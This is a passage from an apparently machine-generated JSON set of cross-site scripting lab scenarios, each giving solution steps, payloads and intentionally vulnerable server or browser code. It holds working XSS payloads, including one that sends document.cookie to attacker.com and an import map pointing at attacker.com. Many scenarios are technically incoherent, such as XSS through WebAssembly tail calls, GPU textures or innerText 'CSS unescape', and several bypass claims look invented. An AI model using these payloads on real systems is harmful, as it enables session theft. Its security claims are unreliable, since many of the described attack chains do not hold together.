      "Lab scenario": "WebAuthn Authenticator Tampering in SSO Dashboard",
      "Lab Description": "Single sign-on system parses WebAuthn authenticatorData without CBOR validation. The application reflects credential ID in admin panel via innerText. To solve: Inject HTML through crafted attestationObject extensions.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Clone authenticator using FIDO2 emulation tools",
        "Craft malicious CBOR: {1: {2: \"<script>alert(1)</script>\"}}",
        "Bypass base64url encoding using non-UTF8 sequences",
        "Automate using Python fido2 library modifications",
        "Verify in Safari's WebAuthn implementation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUJDIiwiZGlzcGxheU5hbWUiOiI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+In0=",
        "authData:new Uint8Array([...atob('<svg/onload=alert(1)>')])"
      ],
      "srcCode": "app.post('/webauthn', (req, res) => {\n  const credential = cbor.decode(req.body.response);\n  db.saveCredential(credential.id); // Raw storage\n  console.debug('AuthData:', credential); // Verbose\n});"
    },
    {
      "Lab scenario": "IndexedDB Schema Pollution in Analytics Dashboard",
      "Lab Description": "User analytics platform creates dynamic object stores using URL parameters. The application uses eval() to generate IndexedDB indexes. To solve: Achieve XSS through NoSQL key injection and query engine reflection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify DB schema generation via Chrome Storage Inspector",
        "Craft store name: ']);alert(1);(['",
        "Bypass key validation using multi-entry indexes",
        "Chain with cursor.continue() infinite loops",
        "Verify through dashboard metric visualization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "db.createObjectStore('${alert(1)}');",
        "index: 'value.replace(/^/, \"</script><svg/onload=alert(1)>\")'"
      ],
      "srcCode": "const createStore = (name) => {\n  eval(`db.createObjectStore('${name}', { \n    keyPath: 'id'\n  })`);\n};\ncreateStore(req.query.storeName);"
    },
    {
      "Lab scenario": "Web Bundle XSS in Document Collaboration Tool",
      "Lab Description": "Shared document viewer parses .wbn files with vulnerable integrity checks. The application uses incorrect Content-Type for nested resources. To solve: Achieve XSS through malicious resource embedding in signed bundle.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze existing bundles using wbn-inspect tool",
        "Inject payload in resources section with text/html type",
        "Bypass signature using length extension attacks",
        "Combine with brotli compression oracle",
        "Verify in Chrome's Isolated Web Apps"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "--boundary\nContent-Type: text/html\n\n<script>alert(1)</script>\n--boundary--",
        "sha256-/3yc...=: <html><body onload=alert(1)></body></html>"
      ],
      "srcCode": "app.post('/upload', (req, res) => {\n  const bundle = parseWebBundle(req.body);\n  if(bundle.signatureValid) {\n    res.render('preview', { content: bundle.resources[0] });\n  }\n});"
    },
    {
      "Lab scenario": "WebTransport Protocol Hijacking in Virtual Classroom",
      "Lab Description": "Educational platform uses WebTransport for real-time document sync with unvalidated stream processing. The application converts binary streams to text via vulnerable TextDecoder. To solve: Achieve XSS through bidirectional stream poisoning.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture WebTransport handshake using Chrome's chrome://net-export",
        "Craft polyglot stream: new TextEncoder().encode('</script><svg onload=alert(1)>')",
        "Bypass MIME sniffing protection using null-byte padding",
        "Automate hijacking with Python trio-websocket library",
        "Verify through collaborative document editing"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "webtransport://example.com/#<iframe/src=javascript:alert(1)>"
      ],
      "srcCode": "const transport = new WebTransport('https://example.com');\nconst writer = transport.datagrams.writable.getWriter();\nawait writer.write(new TextEncoder().encode(userContent)); // Unsafe"
    },
    {
      "Lab scenario": "SharedArrayBuffer Timing XSS in Cryptocurrency Wallet",
      "Lab Description": "Digital wallet uses SharedArrayBuffer for transaction signing with side-channel leaks. The application reflects timing differences in UI updates. To solve: Exfiltrate private key via precision timing attacks and DOM injection.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Measure performance.now() differences during signing operations",
        "Craft payload: <div id=${leakedKey}></div>",
        "Bypass Spectre mitigations using Web Workers",
        "Chain with requestAnimationFrame() precision timing",
        "Verify through transaction history reflection"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<script>new SharedArrayBuffer(1024);Atomics.store(heap,0,Date.now())</script>",
        "onpointerrawupdate=({timeStamp})=>alert(timeStamp)"
      ],
      "srcCode": "app.post('/sign', (req, res) => {\n  const buffer = new SharedArrayBuffer(256);\n  performCryptoOp(buffer);\n  res.send(`<div>Operation took: ${performance.now()}ms</div>`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "Import Maps Injection in Micro-Frontend Architecture",
      "Lab Description": "Enterprise dashboard uses dynamic import maps for module loading. The application constructs import map JSON from URL parameters without validation. To solve: Hijack module resolution to load malicious ES6 modules.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept import map request via Burp Suite",
        "Inject payload: {\"imports\": {\"@app/\": \"https://attacker.com/\"}}",
        "Bypass integrity checks using import assertions",
        "Automate with Playwright script testing module aliases",
        "Verify through Chrome DevTools Sources panel"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "import('https://attacker.com/malicious.js', {assert: {type: 'json'}});",
        "<script type=\"importmap\">{\"imports\":{\"lodash\":\"data:text/javascript,alert(1)\"}}</script>"
      ],
      "srcCode": "app.get('/import-map', (req, res) => {\n  res.json({\n    imports: JSON.parse(req.query.modules) // Vulnerable\n  });\n});"
    },
    {
      "Lab scenario": "Trusted Types Bypass via iframe Policy Inheritance in CMS",
      "Lab Description": "Content management system implements Trusted Types but allows policy inheritance in iframes. The application uses document.write() in nested browsing contexts. To solve: Escape iframe sandbox through prototype pollution of default policy.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify iframe with lax policy using TT auditor extension",
        "Craft payload: <iframe srcdoc=\"<script>alert(1)</script>\">",
        "Bypass CSP using policy.createHTML() callback override",
        "Chain with DOM clobbering of trustedTypes.defaultPolicy",
        "Verify in Chromium-based browsers with TT enforcement"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "trustedTypes.createPolicy('default', {createHTML: s => s});",
        "<iframe src=\"javascript:trustedTypes.emptyHTML\"></iframe>"
      ],
      "srcCode": "app.get('/embed', (req, res) => {\n  res.send(`<iframe srcdoc='${req.query.content}'></iframe>`);\n  console.warn('Unsanitized iframe content:', req.query.content); // Debug log\n});"
    },
    {
      "Lab scenario": "WASI Filesystem Polyglot XSS in Document Converter",
      "Lab Description": "Cloud file converter executes WASI modules for format transformations. The application maps virtual filesystems without path validation. To solve: Write malicious JS to DOM through filesystem-to-UI bridge.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze WASI syscalls using Wasmer debugger",
        "Craft payload: fs.writeFileSync('/dom/output', '<script>alert(1)</script>')",
        "Bypass filename restrictions using NTFS stream syntax",
        "Automate with WebAssembly Studio CLI",
        "Verify through converted document preview"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "wasmtime run --mapdir /dom::./malicious.wasm",
        "fs.readFileSync('\\\\?\\C:\\dom', {encoding: 'utf8'})"
      ],
      "srcCode": "const wasi = new WASI({\n  preopenDirectories: { '/dom': process.cwd() } // Dangerous\n});\nfs.readFile('output.html', (err, data) => {\n  document.body.innerHTML = data.toString(); // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebTransport Bidirectional Stream XSS in Autonomous Vehicle Telemetry",
      "Lab Description": "Self-driving car interface processes WebTransport bidirectional streams with unsafe TextDecoderStream handling. The application renders real-time sensor data via innerHTML concatenation. To solve: Inject fragmented XSS payloads through stream chunk manipulation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept WebTransport session via Chrome DevTools Protocol",
        "Craft payload: writer.write(new TextEncoder().encode('</script><svg onload=alert(1)>'))",
        "Bypass chunk validation using QUIC stream resets",
        "Automate with webtransport-py client library",
        "Verify through 3D LiDAR visualization"
      ],
      "payloads": [
        "new TextEncoder().encode('</script><iframe/src=javascript:alert(1)></iframe>')",
        "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "srcCode": "const stream = await transport.createBidirectionalStream();\nconst reader = stream.readable.getReader();\nreader.read().then(({value}) => {\n  dashboard.innerHTML += new TextDecoder().decode(value); // Vulnerable\n});"
    },
    {
      "Lab scenario": "CSS Font Palettes XSS in Branding Toolkit",
      "Lab Description": "Corporate branding platform implements @font-palette-values with unsafe CSSOM manipulation. The application allows user-defined palette names via template literals. To solve: Break style context through palette name injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify font palette usage via Computed Styles",
        "Craft payload: @font-palette-values --</style><script>alert(1)</script>",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with @font-face local() source",
        "Verify through PDF style guide export"
      ],
      "payloads": [
        "@font-palette-values --\\3C script\\3E { font-family: x; }",
        "override-colors: 0 #ffffff</style><svg/onload=alert(1)>"
      ],
      "srcCode": "const styles = `@font-palette-values ${userName} { ${userRules} }`;\ndocument.adoptedStyleSheets.push(new CSSStyleSheet().replace(styles));"
    },
    {
      "Lab scenario": "WebNN Model Weights XSS in AI-Powered Recruiting",
      "Lab Description": "Job matching service loads ONNX models with unsafe tensor metadata reflection. The application displays model layer names in debug UI via innerHTML. To solve: Inject HTML through crafted weight matrix labels.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Modify ONNX model using onnx-modifier",
        "Craft payload: {\"name\":\"</title><svg/onload=alert(1)>\"}",
        "Bypass model signature validation via int8 quantization",
        "Chain with WebGPU buffer binding",
        "Verify through candidate matching dashboard"
      ],
      "payloads": [
        "tensor([[60,115,99],[114,105,112],[116,62]]) <!-- ASCII <script> -->",
        "model_outputs[0].name = '</script><img/src=x onerror=alert(1)>'"
      ],
      "srcCode": "const model = await navigator.ml.createContext().loadModel(userUpload);\ndebugUI.innerHTML += model.outputs.map(o => o.name).join(', ');"
    },
    {
      "Lab scenario": "ARIA 2.0 Role XSS in Accessibility Dashboard",
      "Lab Description": "WCAG compliance tool implements ARIA 2.0 roles with dangerous aria-description reflection. The application uses setAttribute('aria-description') with raw user input. To solve: Abuse aria-details to bypass sanitization.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify ARIA 2.0 support via a11y tree",
        "Craft payload: <div role=\"generic\" aria-details=\"</div><script>alert(1)</script>\">",
        "Bypass DOM clobbering protections using ShadowRoot",
        "Chain with aria-flowto focus redirection",
        "Verify through axe-core audit results"
      ],
      "payloads": [
        "<span role=\"math\" aria-describedat=\"x\"><template id=\"x\" shadowroot=open><script>alert(1)</script>",
        "<div aria-roledescription=\"\\3C script\\3E alert(1) \\3C /script\\3E\"></div>"
      ],
      "srcCode": "element.setAttribute('aria-description', userInput);\n// Vulnerable aria reflection: document.getElementById('a11y-tree').innerHTML = element.outerHTML;"
    },
    {
      "Lab scenario": "WebCodecs AudioFrame XSS in Podcast Platform",
      "Lab Description": "Audio hosting service processes raw AudioFrame data with unsafe waveform visualization. The application renders decoded samples via <canvas> with vulnerable data URI generation. To solve: Inject payloads through crafted PCM sample values.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Generate malicious WAV file with Audacity",
        "Craft payload: PCM samples matching [60,115,99,114...] (ASCII <script>)",
        "Bypass sample rate validation using resampling",
        "Chain with Web Audio API AnalyserNode",
        "Verify through waveform SVG export"
      ],
      "payloads": [
        "new AudioData({sampleRate: 44100, data: new Float32Array([0.000060, 0.000115, ...])",
        "data:audio/wav;base64,UklGRl8AAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ==..."
      ],
      "srcCode": "const decoder = new AudioDecoder({\n  output: frame => {\n    canvasCtx.fillText(frame.timestamp.toString(), 10, 10); // Vulnerable\n  }\n});"
    },
    {
      "Lab scenario": "WebAssembly Tail Call XSS in Code Optimization Platform",
      "Lab Description": "Performance tool visualizes WASM tail call optimizations with unsafe error message rendering. The application displays function names via innerHTML during stack trace debugging. To solve: Inject HTML through malformed tail call recursion metadata.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile WASM with malformed tail calls using wasm-tools",
        "Craft payload: (func $xss (param i32) (result i32) (return_call $xss))",
        "Bypass stack depth validation using mutual recursion",
        "Chain with exception handling postMessage",
        "Verify via debugger stack visualization"
      ],
      "payloads": [
        "(module (func $xss (return_call $xss)) (start $xss))",
        "data:application/wasm;base64,AGFzbQEAAAABBwF/AkAACgEBAX8BAAALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
      ],
      "srcCode": "try { instance.exports.optimize(); } catch (e) {\n  debuggerUI.innerHTML = e.stack; // Vulnerable\n}"
    },
    {
      "Lab scenario": "CSS Animation Timeline XSS in Interactive Storytelling Platform",
      "Lab Description": "Multimedia platform implements scroll-driven animations with unsafe timeline name handling. The application allows user-controlled animation-timeline names via CSSOM. To solve: Break style context through timeline identifier injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify timeline binding via Animations panel",
        "Craft payload: animation-timeline: --</style><script>alert(1)</script>",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with @scroll-timeline polyfill",
        "Verify through EPUB export rendering"
      ],
      "payloads": [
        "@keyframes x { from { timeline-scope: \\3C script\\3E } }",
        "animation: x linear; animation-timeline: --\\3C script\\3E"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`@keyframes ${userName} { ... }`);\ndocument.adoptedStyleSheets.push(sheet);"
    },
    {
      "Lab scenario": "WebLocks API Race Condition XSS in Collaborative Editor",
      "Lab Description": "Real-time document editor implements WebLocks with unsafe lock name reflection. The application displays active locks in debug UI via dangerouslySetInnerHTML. To solve: Trigger XSS through rapid lock acquisition/release cycles.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify lock acquisition via Performance tab",
        "Craft payload: navigator.locks.request('</script><svg/onload=alert(1)>', () => {})",
        "Bypass name validation using Unicode bidirectional override",
        "Automate with Promise.all() race attacks",
        "Verify through debug overlay"
      ],
      "payloads": [
        "navigator.locks.request('\\202E}\\202Ealert(1)//', () => {})",
        "lockManager.query().then(locks => { document.body.innerHTML = locks.held; })"
      ],
      "srcCode": "navigator.locks.request(userLockName, async lock => {\n  debugDiv.innerHTML += `Lock: ${lock.name}`; // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebUSB Descriptor Spoofing XSS in Industrial Control Panel",
      "Lab Description": "SCADA system connects to USB-HID devices with unsafe descriptor parsing. The application renders device serial numbers via innerText with vulnerable CSS escapes. To solve: Spoof USB descriptors with malicious serial numbers.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Program USB device using Teensy 4.1",
        "Craft payload: \"serialNumber\": \"\\3C script\\3E alert(1)\\3C /script\\3E\"",
        "Bypass descriptor validation using phantom interfaces",
        "Automate with WebUSB polyfill",
        "Verify through HMI dashboard"
      ],
      "payloads": [
        "{\"vendorId\":0x1234,\"productId\":0x5678,\"serialNumber\":\"<iframe/src=javascript:alert(1)>\"}",
        "usbDevice.controlTransferOut({data: new TextEncoder().encode('</script>')})"
      ],
      "srcCode": "navigator.usb.requestDevice({ filters: [] }).then(device => {\n  statusDiv.innerText = device.serialNumber; // Vulnerable CSS unescape\n});"
    },
    {
      "Lab scenario": "SVG Font Kerning XSS in E-Book Reader",
      "Lab Description": "EPUB renderer processes SVG font kerning pairs with unsafe `<hkern>` parsing. The application uses DOMPurify 3.0.0 with whitelisted `<hkern>` attributes. To solve: Inject XSS through glyph name overflows.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft EPUB with malicious SVG font using Sigil",
        "Inject payload: <hkern g1=\"</font><script>alert(1)</script>\" g2=\"x\"/>",
        "Bypass MIME validation using polyglot EPUB/ZIP",
        "Chain with CSS font-variant-ligatures",
        "Verify through footnote rendering"
      ],
      "payloads": [
        "<font><hkern g1=\"\\3C script\\3E\" g2=\"alert(1)\"/>",
        "@font-face { font-family:x; src:url('data:image/svg+xml,<svg>...</svg>') }"
      ],
      "srcCode": "bookRenderer.loadFont(userFont).then(() => {\n  viewerDiv.innerHTML = bookContent; // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebGPU Storage Texture XSS in 3D Medical Imaging",
      "Lab Description": "Radiology viewer maps storage textures to DOM via unsafe buffer sharing. The application visualizes DICOM data using compute shaders without output validation. To solve: Corrupt texture data to inject HTML through FP32 precision abuse.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Reverse-engineer shader with WGSL analyzer",
        "Craft payload: [[group(2), binding(0)]] var tex: texture_storage_2d<rgba8unorm, write>",
        "Bypass format checks using texture view reinterpretation",
        "Chain with indirect dispatch validation bypass",
        "Verify through DICOM metadata overlay"
      ],
      "payloads": [
        "textureStore(tex, vec2<i32>(), vec4<f32>(0.000060, 0.000115, 0.000099, 0.000062)) <!-- ASCII <script> -->",
        "dispatchWorkgroupsIndirect(/* buffer with 0x3C736372 payload */)"
      ],
      "srcCode": "const texture = device.createTexture({ format: 'rgba8unorm', usage: GPUTextureUsage.STORAGE });\ndocument.getElementById('overlay').innerHTML = \n  new TextDecoder().decode(texture.read());"
    },
    {
      "Lab scenario": "CSS Scope Escalation XSS in Design System Builder",
      "Lab Description": "Component library implements @scope rules with vulnerable selector concatenation. The application allows user-controlled scope roots via template literals. To solve: Break style isolation through universal selector abuse.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify scope boundary via Computed Styles",
        "Craft payload: @scope ([attr^=\"</style><script>alert(1)</script>\"])",
        "Bypass sanitizer using CSS Unicode escapes",
        "Chain with :has() selector polyfill",
        "Verify through design token preview"
      ],
      "payloads": [
        "@scope (\\3C script\\3E) { :scope { color: red; } }",
        "[attr^='</style><iframe/src=javascript:alert(1)>'] { --x: ; }"
      ],
      "srcCode": "const styles = `@scope (${userInput}) { /* ... */ }`;\ndocument.adoptedStyleSheets.push(new CSSStyleSheet().replace(styles));"
    },
    {
      "Lab scenario": "Fetch Priority Injection XSS in Ad Tech Platform",
      "Lab Description": "Real-time bidding system reflects Fetch Priority headers in debug logs without sanitization. The application uses innerHTML with server-side header logging. To solve: Bypass header normalization via HTTP/2 stream multiplexing.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept bid request via Charles Proxy",
        "Inject payload: Priority: u=3, i=\"<script>alert(1)</script>\"",
        "Bypass HPACK compression using literal headers",
        "Automate with h2load stress testing",
        "Verify through bid analytics dashboard"
      ],
      "payloads": [
        "Sec-Priority: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
        "Accept-CH: Lifetime=<svg/onload=alert(document.domain)>"
      ],
      "srcCode": "app.get('/debug', (req, res) => {\n  res.send(`<pre>Priority: ${req.headers['priority']}</pre>`); // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebHID Barcode Scanner XSS in Inventory System",
      "Lab Description": "Warehouse management system processes USB barcode scanners with unsafe HID report parsing. The application renders scanned data via innerText with CSS unescape. To solve: Spoof barcode payloads through custom report descriptors.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Program HID device using Flipper Zero",
        "Craft payload: \"usagePage\": 0xFF60, \"usage\": 0x3C736372 (Hex for <script)",
        "Bypass input validation using report ID spoofing",
        "Automate with WebHID report listener",
        "Verify through stock level dashboard"
      ],
      "payloads": [
        "{\"vendorId\":0x1234,\"productId\":0x5678,\\'reportDescriptor\":[0x06, 0x60, 0xFF, ... /* <script> */]}",
        "inputReportCache = new Uint8Array([0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E])"
      ],
      "srcCode": "device.addEventListener('inputreport', e => {\n  inventoryList.innerText += new TextDecoder().decode(e.data); // Vulnerable CSS unescape\n});"
    },
    {
      "Lab scenario": "MathML Entity XSS in Scientific Publishing Platform",
      "Lab Description": "Research paper viewer processes MathML equations with unsafe entity expansion. The application uses DOMPurify 3.0.0 with broken &ent; unescape handling. To solve: Abuse entity references to reconstruct script tags.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify MathML rendering via Elements panel",
        "Craft payload: &lt;script&gt;alert(1)&lt;/script&gt;",
        "Bypass sanitizer using numeric character references",
        "Chain with <maction> behavior handlers",
        "Verify through PDF equation export"
      ],
      "payloads": [
        "<math><mtext>&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;</mtext></math>",
        "<menclose notation='updiagonalstrike'></menclose><script>alert(1)</script>"
      ],
      "srcCode": "app.post('/equation', (req, res) => {\n  res.send(`<math>${req.body.content}</math>`); // Vulnerable entity handling\n});"
    },
    {
      "Lab scenario": "WebAssembly SIMD Memory Corruption in Cryptography Toolkit",
      "Lab Description": "Blockchain library uses WASM SIMD for fast hashing with unsafe memory mapping to DOM. The application reflects SIMD vector results via innerHTML during debug mode. To solve: Manipulate v128 values to craft HTML payloads through vector lane corruption.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Compile SIMD module with wasm-pack",
        "Craft payload: i32x4.splat(0x3C736372) <!-- ASCII <scr -->",
        "Bypass lane validation using shuffle operations",
        "Chain with relaxed SIMD proposals",
        "Verify via debug console hexdump"
      ],
      "payloads": [
        "v128.load(mem, i32.const 0).i32x4.replace_lane(0, 0x3C)",
        "data:application/wasm;base64,V2FzbVZlcnNpb24gMS4wCgA="
      ],
      "srcCode": "const simdMem = new WebAssembly.Memory({ initial: 1 });\nconst instance = await WebAssembly.instantiate(simdModule, { env: { simdMem } });\ndocument.getElementById('debug').innerHTML = \n  new TextDecoder().decode(simdMem.buffer);"
    },
    {
      "Lab scenario": "CSS Font Tech XSS in Digital Publishing Platform",
      "Lab Description": "E-book platform implements COLRv1 fonts with unsafe variation axis handling. The application allows user-controlled font variations via CSSOM. To solve: Abuse font tech features to break style context through axis overflow.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create malicious variable font using FontForge",
        "Craft payload: font-variation-settings: \"</style><script>alert(1)</script>\" 1",
        "Bypass axis validation using fractional values",
        "Chain with font-palette property",
        "Verify through EPUB rendering engine"
      ],
      "payloads": [
        "@font-face { font-family:x; src:url('data:font/woff2;base64,...') }",
        "font-variation-settings: \"\\3C script\\3E\" 1"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userFontRules} }`);\ndocument.adoptedStyleSheets = [sheet];"
    },
    {
      "Lab scenario": "WebTransport Datagram Reflection in Drone Fleet Management",
      "Lab Description": "UAV control system processes QUIC datagrams with unsafe buffer accumulation. The application renders telemetry data via innerHTML without validation. To solve: Inject XSS through fragmented datagram payloads with MTU bypass.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft DATAGRAM frames using ngtcp2",
        "Split payload: [0x3C, 0x73], [0x63, 0x72], ...",
        "Bypass flow control using connection migration",
        "Automate with webtransport-go",
        "Verify through 3D flight path visualization"
      ],
      "payloads": [
        "quic.SendDatagram([]byte{'<','s','c','r','i','p','t','>'})",
        "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "srcCode": "transport.datagrams.readable.getReader().read().then(({value}) => {\n  telemetryDiv.innerHTML += new TextDecoder().decode(value); // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebNFC NDEF Type Spoofing in Retail Inventory",
      "Lab Description": "Smart shelf system processes NFC tags with unsafe NDEF type handling. The application renders product URLs via innerHTML without validation. To solve: Spoof NDEF records with javascript: payloads in type fields.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Program NFC tag with NDEF type: 'text/javascript'",
        "Craft payload: NDEFRecord({ recordType: 'javascript:alert(1)' })",
        "Bypass URL validation using UTF-16 encoding",
        "Automate with WebNFC polyfill",
        "Verify through mobile PWA interface"
      ],
      "payloads": [
        "ndefWriter.write({ records: [{ recordType: 'javascript:alert(1)', data: new TextEncoder().encode('') }] })",
        "navigator.nfc.push('javascript:/*%00*/alert(document.domain)')"
      ],
      "srcCode": "navigator.nfc.watch(message => {\n  productList.innerHTML += message.records[0].recordType; // Vulnerable\n});"
    },
    {
      "Lab scenario": "ARIA 2.0 Property Clobbering in Accessibility Dashboard",
      "Lab Description": "WCAG compliance tool implements aria-keyshortcuts with dangerous DOM reflection. The application uses element.outerHTML to display ARIA states. To solve: Abuse aria-colcount/aria-rowindex to clobber DOM properties.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify ARIA 2.0 property reflection",
        "Craft payload: <div aria-colcount=\"</div><script>alert(1)</script>\">",
        "Bypass sanitizer using aria-atomic=\"true\"",
        "Chain with shadow DOM slot distribution",
        "Verify through automated a11y audits"
      ],
      "payloads": [
        "<table aria-rowindex=\"\\3C script\\3E alert(1)\"></table>",
        "<div role='grid' aria-colcount='<iframe/src=javascript:alert(1)>'></div>"
      ],
      "srcCode": "element.setAttribute('aria-keyshortcuts', userInput);\n// Vulnerable reflection: auditLog.innerHTML = element.outerHTML;"
    },
    {
      "Lab scenario": "DOM-based XSS in Healthcare Portal URL Fragment Processing",
      "Lab Description": "Patient records system dynamically loads content from URL fragments using vulnerable decodeURIComponent() parsing. The application renders lab results without output encoding. To solve: Execute alert(document.domain) through double-encoded hash payloads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept fragment change event using Burp Suite's DOM Invader extension",
        "Validate with payload: #%3Cimg%2520src%3Dx%2520onerror%3Dalert%25281%2529%3E",
        "Bypass client-side validation using null-byte termination",
        "Chain with history.replaceState() to trigger parser differential",
        "Verify in legacy browser modes"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "#<img%20src=x%20onerror=alert(window.origin)>",
        "javascript:eval(decodeURIComponent('%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29'))"
      ],
      "srcCode": "window.onhashchange = () => {\n  const content = decodeURIComponent(location.hash.slice(1));\n  document.getElementById('results').innerHTML = content; // Vulnerable\n}"
    },
    {
      "Lab scenario": "Stored XSS in E-Commerce Product Reviews via AngularJS Sandbox Escape",
      "Lab Description": "Product review system uses AngularJS 1.8 with unsafe $sce configuration. The application sanitizes input but allows certain HTML elements. To solve: Achieve persistent XSS using prototype pollution in review comments.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify AngularJS version via source map analysis",
        "Craft payload: {{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
        "Bypass CSP using angular.element().append() sink",
        "Automate with Postman collection targeting /api/reviews",
        "Verify persistence across user sessions"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</div>",
        "<input ng-focus=\"$event.path[0].ownerDocument.defaultView.alert(1)\">"
      ],
      "srcCode": "app.post('/reviews', (req, res) => {\n  const review = {\n    content: req.sanitize(req.body.content) // Incomplete\n  };\n  db.save(review);\n});"
    },
    {
      "Lab scenario": "Mutation XSS in Social Media SVG Avatar Upload",
      "Lab Description": "Profile picture uploader accepts SVG files but fails to sanitize foreignObject tags. The application uses DOMPurify 2.4.0 with unsafe configuration. To solve: Achieve XSS through namespace confusion in SVG/HTML5 parser.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Upload test SVG using OWASP ZAP file upload scanner",
        "Craft payload: <svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
        "Bypass sanitizer using MathML namespace prefixes",
        "Combine with iframe srcdoc attribute",
        "Verify in Firefox's SVG rendering engine"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
        "<svg><animate attributeName='href' values='javascript:alert(1)'/>"
      ],
      "srcCode": "app.post('/avatar', (req, res) => {\n  const svg = DOMPurify.sanitize(req.files.avatar.data);\n  fs.writeFileSync(uploadPath, svg); // Sanitization bypass\n});"
    },
    {
      "Lab scenario": "Blind XSS in Customer Support Chat WebSocket Messages",
      "Lab Description": "Live chat application stores WebSocket messages in admin panel with 12-hour delay. The application uses raw WebSocket.send() without output encoding. To solve: Trigger alert() when support agent views chat history.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept WebSocket handshake with Burp Suite",
        "Craft delayed payload: <img src=x onerror=setTimeout(()=>alert(1),43200000)>",
        "Bypass message size limits using DEFLATE compression",
        "Automate with Python websockets library",
        "Monitor admin interface for payload execution"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<script>fetch('https://attacker.com?cookie='+document.cookie)</script>",
        "<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>"
      ],
      "srcCode": "wss.on('connection', (ws) => {\n  ws.on('message', (msg) => {\n    db.storeMessage(msg); // Raw storage\n  });\n});"
    },
    {
      "Lab scenario": "Reflected XSS in Travel Booking API JSONP Endpoint",
      "Lab Description": "Flight search API implements JSONP callback without validation. The application reflects callback parameter in Content-Type header. To solve: Achieve XSS through JavaScript MIME type confusion.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Identify JSONP endpoint via ?callback= param",
        "Craft payload: /api/search?callback=alert(1)//",
        "Bypass charset restrictions using UTF-7 encoding",
        "Automate with curl and timing analysis",
        "Verify in IE11 compatibility mode"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "/**/alert(1);",
        ")?}alert(1);//",
        "jQuery3110([{data:1}])"
      ],
      "srcCode": "app.get('/api/search', (req, res) => {\n  res.set('Content-Type', 'application/javascript');\n  res.send(`${req.query.callback}(${JSON.stringify(results)})`);\n});"
    },
    {
